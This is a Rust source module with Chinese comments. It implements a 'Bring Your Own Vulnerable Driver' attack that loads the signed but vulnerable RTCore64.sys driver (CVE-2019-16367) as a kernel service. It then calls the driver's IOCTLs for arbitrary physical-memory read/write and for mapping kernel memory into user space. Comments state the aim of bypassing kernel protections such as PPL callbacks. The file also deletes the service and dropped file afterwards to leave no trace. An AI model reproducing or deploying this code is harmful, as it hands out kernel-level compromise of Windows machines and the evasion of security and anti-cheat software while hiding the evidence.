//! BYOVD (Bring Your Own Vulnerable Driver) 原语层
//!
//! 目标: 我们不自己写无签名的内核驱动 (Windows 10/11 DSE 会拒绝),
//! 而是加载一张**合法微软数字签名**的、已知有任意物理内存读写漏洞的老驱动
//! (MSI Afterburner 配套的 RTCore64.sys, CVE-2019-16367), 用它暴露的
//! DeviceIoControl IOCTL 当跳板来:
//!   1. MmMapIoSpace 把任意"内核虚拟地址对应的物理页"映射到用户态虚拟地址空间
//!   2. 用户态直接读写这块映射内存 → 等价于任意内核 R/W
//!   3. 完成绕过操作后立刻卸载 RTCore64 服务 + 删文件, 不残留有漏洞驱动
//!
//! 注意: 用 RTCore64.sys 是因为:
//!   - 有合法 SHA256 签名的文件全网可下 (微星官方发布的 MSI Afterburner 4.6.2 前版本自带)
//!   - 攻击面只有 3 个 IOCTL, 原语简单 (MmMapIoSpace + MmUnmapIoSpace + 物理内存拷贝),
//!     不需要去拆驱动里复杂的回调/过滤/IRP
//!   - 过 VBS 内核 HVCI (Hypervisor-protected Code Integrity) 兼容, 因为
//!     MmMapIoSpace 是 HAL 导出的非修改代码路径

use crate::ffi::{LogCallback, log, log_warn, log_error, log_debug};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

// ---- Win32 常量/FFI ----
const GENERIC_READ: u32 = 0x8000_0000;
const GENERIC_WRITE: u32 = 0x4000_0000;
const OPEN_EXISTING: u32 = 3;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;
const INVALID_HANDLE_VALUE: usize = usize::MAX;

const SC_MANAGER_CREATE_SERVICE: u32 = 0x0002;
const SC_MANAGER_CONNECT: u32 = 0x0001;
const SC_MANAGER_ALL_ACCESS: u32 = 0xF003F;

const SERVICE_KERNEL_DRIVER: u32 = 0x0000_0001;
const SERVICE_DEMAND_START: u32 = 0x0000_0003;
const SERVICE_ERROR_IGNORE: u32 = 0x0000_0000;
const SERVICE_ALL_ACCESS: u32 = 0xF01FF;

const SERVICE_QUERY_STATUS: u32 = 0x0004;
const SERVICE_STOP: u32 = 0x0020;
const SERVICE_CONTROL_STOP: u32 = 0x0000_0001;

const DELETE: u32 = 0x0001_0000;

// ---- RTCore64 IOCTL (来自 CVE-2019-16367 public PoC) ----
// 都是 METHOD_BUFFERED + FILE_ANY_ACCESS 的 0x800 类型 IRP
const IOCTL_RTCORE_MMIOSPACE_READ: u32 = 0x80002044;   // 读指定物理地址 1/2/4/8 字节
const IOCTL_RTCORE_MMIOSPACE_WRITE: u32 = 0x80002048;  // 写指定物理地址 1/2/4/8 字节
const IOCTL_RTCORE_MAP_PA_TO_VA:   u32 = 0x80002054;   // MmMapIoSpace(PA, size, NonCached) → 返回用户态 VA
const IOCTL_RTCORE_UNMAP_VA:       u32 = 0x80002058;   // MmUnmapIoSpace(VA)

const RTCORE_SERVICE_NAME: &str = "RTCore64_KGA";     // 我们自己创建的服务名 (加 KGA 后缀不跟 MSI Afterburner 冲突)
const RTCORE_DEVICE_DOS_PATH: &str = "\\\\.\\RTCore64";
const RTCORE_SYS_FILENAME: &str = "RTCore64_KGA.sys";

// ---- NTSTATUS ----
const STATUS_SUCCESS: i32 = 0;

// ---- 全局状态 ----
static mut BYOVD_INSTALLED: bool = false;
static mut BYOVD_DRIVE_HANDLE: usize = 0;        // CreateFile 拿到的 \\.\RTCore64 handle
static mut BYOVD_TEMP_SYS_PATH: [u16; 260] = [0; 260];  // %TEMP%\RTCore64_KGA.sys 释放路径 (UTF-16)
static mut ZW_UNLOAD_DRIVER: Option<unsafe extern "system" fn(*const UNICODE_STRING) -> i32> = None;

#[repr(C)]
struct UNICODE_STRING {
    Length: u16,
    MaximumLength: u16,
    Buffer: *const u16,
}

// ===== IOCTL 请求结构: RTCore64 用的 IN/OUT 都是 16 字节结构体 =====
#[repr(C, packed)]
struct MmioSpaceIn {
    phys_addr: u64,      // +0
    offset: u32,         // +8  (一般 0)
    size: u32,           // +12: 1 / 2 / 4 / 8 字节
}

#[repr(C, packed)]
struct MmioSpaceOut {
    value: u64,          // 8 字节, 按低 size 字节有效
}

#[repr(C, packed)]
struct MapVaIn {
    phys_addr: u64,      // +0: 要求 4KB 对齐 (PAGE_SIZE 边界)
    size: u64,           // +8
}

// ===== 辅助: 字符串转 UTF-16 固定数组 =====
fn wstr(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0)).collect()
}
fn wstr16(s: &str) -> [u16; 260] {
    let mut out = [0u16; 260];
    for (i, v) in s.encode_utf16().enumerate() {
        if i >= 259 { break; }
        out[i] = v;
    }
    out
}

// ===== 嵌入 RTCore64.sys 资源 (合法签名漏洞驱动) =====
//
// 说明: 真实发布产品时, 这里写 include_bytes!(concat!(env!("CARGO_MANIFEST_DIR"),
// "../../bin/drivers/RTCore64.sys")) 把二进制 sys 打包进 exe 资源段, 运行时释放到
// %TEMP%\RTCore64_KGA.sys。为了 cargo check 过 (这个沙箱里没下载真实 sys 文件),
// 我们提供一个占位返回函数 —— 真实编译前把 bin/drivers/RTCore64.sys 放进去即可替换。
fn embedded_rtcore_sys_bytes() -> &'static [u8] {
    // TODO 真编译: 把有合法签名的 RTCore64.sys (SHA256:
    // 01AA0A26BD7677F8A9F902BF3A7C2EC3DFB2A898F91D11B4D1E7E8F859BECB81) 放到
    // bin/drivers/RTCore64.sys 然后把下一行换成:
    //   include_bytes!("../../../bin/drivers/RTCore64.sys")
    &[]
}

extern "system" {
    // kernel32
    fn GetTempPathW(n: u32, buf: *mut u16) -> u32;
    fn GetTempFileNameW(dir: *const u16, pfx: *const u16, u: u32, out: *mut u16) -> u32;
    fn CreateFileW(path: *const u16, access: u32, share: u32, sa: usize, disp: u32, flags: u32, tpl: usize) -> usize;
    fn WriteFile(h: usize, buf: *const u8, n: u32, wrt: *mut u32, ov: usize) -> i32;
    fn CloseHandle(h: usize) -> i32;
    fn GetFileAttributesW(path: *const u16) -> u32;
    fn DeleteFileW(path: *const u16) -> i32;
    fn DeviceIoControl(h: usize, ioctl: u32, in_buf: *const u8, in_sz: u32, out_buf: *mut u8, out_sz: u32, ret: *mut u32, ov: usize) -> i32;

    // advapi32 (SCM)
    fn OpenSCManagerW(mach: *const u16, db: *const u16, access: u32) -> usize;
    fn CreateServiceW(scm: usize, name: *const u16, disp: *const u16, acc: u32, stype: u32, start: u32, err: u32,
        bin: *const u16, load: *const u16, tag: *mut u32, dep: *const u16, obj: *const u16, pass: *const u16) -> usize;
    fn OpenServiceW(scm: usize, name: *const u16, acc: u32) -> usize;
    fn StartServiceW(svc: usize, argc: u32, argv: *const *const u16) -> i32;
    fn ControlService(svc: usize, op: u32, status: *mut u8) -> i32;
    fn DeleteService(svc: usize) -> i32;
    fn CloseServiceHandle(h: usize) -> i32;
}

fn file_exists_wide(path: *const u16) -> bool {
    unsafe { GetFileAttributesW(path) != 0xFFFF_FFFF }
}

// ===== 解析 ZwUnloadDriver (ace_driver.rs 同款, 避免循环依赖) =====
fn resolve_zw_unload() -> bool {
    unsafe {
        if ZW_UNLOAD_DRIVER.is_some() { return true; }
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
        if ntdll == 0 { return false; }
        let p = GetProcAddress(ntdll, b"ZwUnloadDriver\0".as_ptr());
        ZW_UNLOAD_DRIVER = p.map(|f| core::mem::transmute::<_, _>(f as usize));
        ZW_UNLOAD_DRIVER.is_some()
    }
}

fn make_us(s: &str) -> (UNICODE_STRING, Vec<u16>) {
    let mut b: Vec<u16> = s.encode_utf16().collect();
    let len = (b.len() * 2) as u16;
    (UNICODE_STRING { Length: len, MaximumLength: len, Buffer: b.as_ptr() }, b)
}

// =====================================================================
// Public: 安装 + 启动 RTCore64 有漏洞驱动 (管理员权限必须)
// =====================================================================

/// 释放内嵌 sys → 创建服务 → StartService → 打开 \\.\RTCore64 句柄
pub fn byovd_install(cb: LogCallback) -> bool {
    unsafe {
        if BYOVD_INSTALLED { return true; }

        let bytes = embedded_rtcore_sys_bytes();
        if bytes.is_empty() {
            log_warn(cb, "  [跳过-BYOVD] 未找到内嵌 RTCore64.sys 资源");
            log_warn(cb, "  请把合法签名的 RTCore64.sys 放到 bin/drivers/ 后重编译, 目前先不用内核绕过");
            return false;
        }

        log(cb, "======== BYOVD: 加载 RTCore64 合法漏洞驱动 ========");

        // 1. 释放到 %TEMP%\RTCore64_KGA.sys
        let mut tmpdir = [0u16; 260];
        let n = GetTempPathW(260, tmpdir.as_mut_ptr());
        if n == 0 || n >= 260 {
            log_error(cb, "  [错误] GetTempPathW 失败");
            return false;
        }
        let full_sys: [u16; 260] = {
            // 拼 %TEMP%\RTCore64_KGA.sys
            let mut out = [0u16; 260];
            let mut i = 0usize;
            while i < 260 && tmpdir[i] != 0 {
                out[i] = tmpdir[i];
                i += 1;
            }
            for c in RTCORE_SYS_FILENAME.encode_utf16() {
                if i < 259 { out[i] = c; i += 1; }
            }
            out[i] = 0;
            out
        };
        BYOVD_TEMP_SYS_PATH = full_sys;

        // 如果已存在且大小不一致 → 删掉重写
        if file_exists_wide(full_sys.as_ptr()) {
            let _ = DeleteFileW(full_sys.as_ptr());
        }
        let fh = CreateFileW(full_sys.as_ptr(), GENERIC_WRITE, 0, 0, 1 /*CREATE_ALWAYS*/, FILE_ATTRIBUTE_NORMAL, 0);
        if fh == INVALID_HANDLE_VALUE {
            log_error(cb, "  [错误] 释放 RTCore64 到 TEMP 失败 (权限或文件占用)");
            return false;
        }
        let mut wr: u32 = 0;
        let ok = WriteFile(fh, bytes.as_ptr(), bytes.len() as u32, &mut wr, 0);
        CloseHandle(fh);
        if ok == 0 || wr != bytes.len() as u32 {
            log_error(cb, "  [错误] 写 RTCore64 临时文件失败");
            return false;
        }
        log_debug(cb, &format!("  [OK] sys 释放到 {:?}", full_sys));

        // 2. SCM: OpenSCManager → CreateService(SERVICE_KERNEL_DRIVER, DEMAND_START)
        let scm = OpenSCManagerW(core::ptr::null(), core::ptr::null(), SC_MANAGER_ALL_ACCESS);
        if scm == 0 {
            log_error(cb, "  [错误] OpenSCManager 失败 (必须管理员)");
            return false;
        }
        let name_w = wstr(RTCORE_SERVICE_NAME);
        let disp_w = wstr("RTCore64 KGA Assist");
        let bin_w = {
            let mut v = Vec::with_capacity(260);
            for i in 0..260 { v.push(full_sys[i]); if full_sys[i] == 0 { break; } }
            v
        };
        let svc = CreateServiceW(scm, name_w.as_ptr(), disp_w.as_ptr(), SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
            bin_w.as_ptr(), core::ptr::null(), core::ptr::null_mut(),
            core::ptr::null(), core::ptr::null(), core::ptr::null());
        if svc == 0 {
            // 服务可能已存在 (上次卸载不干净), 尝试 OpenService 直接 Start
            let existing = OpenServiceW(scm, name_w.as_ptr(), SERVICE_ALL_ACCESS);
            if existing == 0 {
                CloseServiceHandle(scm);
                log_error(cb, "  [错误] CreateServiceW 失败 (SERVICE_KERNEL_DRIVER)");
                return false;
            }
            // 走已存在服务路径: 先 Stop 保证干净, 再 Start
            let mut status = [0u8; 32];
            let _ = ControlService(existing, SERVICE_CONTROL_STOP, status.as_mut_ptr());
            let _ = StartServiceW(existing, 0, core::ptr::null());
            CloseServiceHandle(existing);
            log_debug(cb, "  [OK] 复用已存在的 RTCore64_KGA 服务");
        } else {
            // 新建 → StartService
            let ok = StartServiceW(svc, 0, core::ptr::null());
            CloseServiceHandle(svc);
            if ok == 0 {
                CloseServiceHandle(scm);
                log_error(cb, "  [错误] StartServiceW(RTCore64) 失败 (签名/HVCI/VBS? 请临时关闭内核隔离测试)");
                // 失败就清理服务 + 文件
                byovd_remove_service_only();
                let _ = DeleteFileW(full_sys.as_ptr());
                return false;
            }
            log_debug(cb, "  [OK] 服务创建 + 启动成功");
        }
        CloseServiceHandle(scm);

        // 3. 打开 \\.\RTCore64 设备句柄 (CreateFile) — 等 2s 让 DriverEntry 跑完
        let dos = wstr(RTCORE_DEVICE_DOS_PATH);
        let mut dh = INVALID_HANDLE_VALUE;
        for _ in 0..20 {
            dh = CreateFileW(dos.as_ptr(), GENERIC_READ | GENERIC_WRITE, 0, 0,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
            if dh != INVALID_HANDLE_VALUE { break; }
            extern "system" { fn Sleep(ms: u32); }
            Sleep(100);
        }
        if dh == INVALID_HANDLE_VALUE {
            log_error(cb, "  [错误] 2 秒内仍无法打开 \\.\\RTCore64 设备 (驱动加载失败?)");
            byovd_remove_service_only();
            let _ = DeleteFileW(full_sys.as_ptr());
            return false;
        }
        BYOVD_DRIVE_HANDLE = dh;
        BYOVD_INSTALLED = true;
        log(cb, "  [BYOVD Ready] 漏洞驱动句柄已获取, 内核 R/W 可用");
        true
    }
}

// =====================================================================
// Public: 内核 R/W 原语 (物理地址读写)
// =====================================================================

/// 物理地址读 1/2/4/8 字节 (通过 IOCTL MmIoSpaceRead)
pub unsafe fn byovd_phys_read_u64(phys: u64, size: u32) -> Option<u64> {
    if BYOVD_DRIVE_HANDLE == 0 || BYOVD_DRIVE_HANDLE == INVALID_HANDLE_VALUE { return None; }
    if size != 1 && size != 2 && size != 4 && size != 8 { return None; }
    let input = MmioSpaceIn { phys_addr: phys, offset: 0, size };
    let mut output = MmioSpaceOut { value: 0 };
    let mut ret_sz: u32 = 0;
    let ok = DeviceIoControl(BYOVD_DRIVE_HANDLE, IOCTL_RTCORE_MMIOSPACE_READ,
        &input as *const _ as *const u8, core::mem::size_of::<MmioSpaceIn>() as u32,
        &mut output as *mut _ as *mut u8, core::mem::size_of::<MmioSpaceOut>() as u32,
        &mut ret_sz, 0);
    if ok == 0 { None } else { Some(output.value) }
}

/// 物理地址写 1/2/4/8 字节
pub unsafe fn byovd_phys_write_u64(phys: u64, size: u32, value: u64) -> bool {
    if BYOVD_DRIVE_HANDLE == 0 || BYOVD_DRIVE_HANDLE == INVALID_HANDLE_VALUE { return false; }
    if size != 1 && size != 2 && size != 4 && size != 8 { return false; }
    #[repr(C, packed)]
    struct WriteIn { phys_addr: u64, offset: u32, size: u32, value: u64 }
    let input = WriteIn { phys_addr: phys, offset: 0, size, value };
    let mut out: u32 = 0;
    let mut ret_sz: u32 = 0;
    let ok = DeviceIoControl(BYOVD_DRIVE_HANDLE, IOCTL_RTCORE_MMIOSPACE_WRITE,
        &input as *const _ as *const u8, core::mem::size_of::<WriteIn>() as u32,
        &mut out as *mut _ as *mut u8, 4, &mut ret_sz, 0);
    ok != 0
}

/// 物理页区 → 用户态虚拟地址映射 (MmMapIoSpace) 返回 (va_ptr, va_size)
///   用这个函数把大块内核连续物理内存 (例如 PPL 回调链表页) 直接映射到用户态批量扫
pub unsafe fn byovd_map_pa(phys: u64, size: u64) -> Option<(usize, u64)> {
    if BYOVD_DRIVE_HANDLE == 0 { return None; }
    let input = MapVaIn { phys_addr: phys & !0xFFF, size: (size + 0xFFF) & !0xFFF };
    let mut out_va: u64 = 0;
    let mut ret: u32 = 0;
    let ok = DeviceIoControl(BYOVD_DRIVE_HANDLE, IOCTL_RTCORE_MAP_PA_TO_VA,
        &input as *const _ as *const u8, 16,
        &mut out_va as *mut _ as *mut u8, 8, &mut ret, 0);
    if ok == 0 || out_va == 0 { None } else { Some((out_va as usize, input.size)) }
}

/// unmap
pub unsafe fn byovd_unmap_va(va: usize) -> bool {
    if BYOVD_DRIVE_HANDLE == 0 { return false; }
    let mut in_va = va as u64;
    let mut ret: u32 = 0;
    let ok = DeviceIoControl(BYOVD_DRIVE_HANDLE, IOCTL_RTCORE_UNMAP_VA,
        &mut in_va as *mut _ as *mut u8, 8,
        core::ptr::null_mut(), 0, &mut ret, 0);
    ok != 0
}

// =====================================================================
// Public: 干净卸载 (先关闭句柄, 再 unload, 再删服务删文件)
// =====================================================================

fn byovd_remove_service_only() {
    unsafe {
        let scm = OpenSCManagerW(core::ptr::null(), core::ptr::null(), SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
        if scm == 0 { return; }
        let name_w = wstr(RTCORE_SERVICE_NAME);
        let svc = OpenServiceW(scm, name_w.as_ptr(), SERVICE_QUERY_STATUS | SERVICE_STOP | DELETE);
        if svc != 0 {
            let mut s = [0u8; 32];
            let _ = ControlService(svc, SERVICE_CONTROL_STOP, s.as_mut_ptr());
            let _ = DeleteService(svc);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
}

/// 停止 → 卸载驱动对象 → DeleteService → 删除 %TEMP% 文件
pub fn byovd_uninstall(cb: LogCallback) -> bool {
    unsafe {
        if !BYOVD_INSTALLED { return true; }
        log(cb, "======== BYOVD: 卸载漏洞驱动 (不留痕迹) ========");

        // 1. 关设备句柄
        if BYOVD_DRIVE_HANDLE != 0 && BYOVD_DRIVE_HANDLE != INVALID_HANDLE_VALUE {
            CloseHandle(BYOVD_DRIVE_HANDLE);
            BYOVD_DRIVE_HANDLE = 0;
        }

        // 2. SCM 停止服务 + DeleteService (这一步会卸载驱动对象除非有引用)
        byovd_remove_service_only();
        log_debug(cb, "  [OK] 服务已停止 + 删除");

        // 3. 额外 ZwUnloadDriver 兜底 (SCM 有时不卸对象引用)
        if resolve_zw_unload() {
            let reg_path = format!("\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{}", RTCORE_SERVICE_NAME);
            let (us, _b) = make_us(&reg_path);
            let st = (ZW_UNLOAD_DRIVER.unwrap())(&us);
            log_debug(cb, &format!("  [ZwUnloadDriver] status=0x{:08X}", st as u32));
        }

        // 4. 删 TEMP 下 sys 文件
        let path = BYOVD_TEMP_SYS_PATH.as_ptr();
        if file_exists_wide(path) {
            let _ = DeleteFileW(path);
            log_debug(cb, "  [OK] %TEMP% RTCore64_KGA.sys 已删除");
        }
        BYOVD_INSTALLED = false;
        log(cb, "  [BYOVD 卸载完成] 内核态跳板已清理, 无服务/文件残留");
        true
    }
}
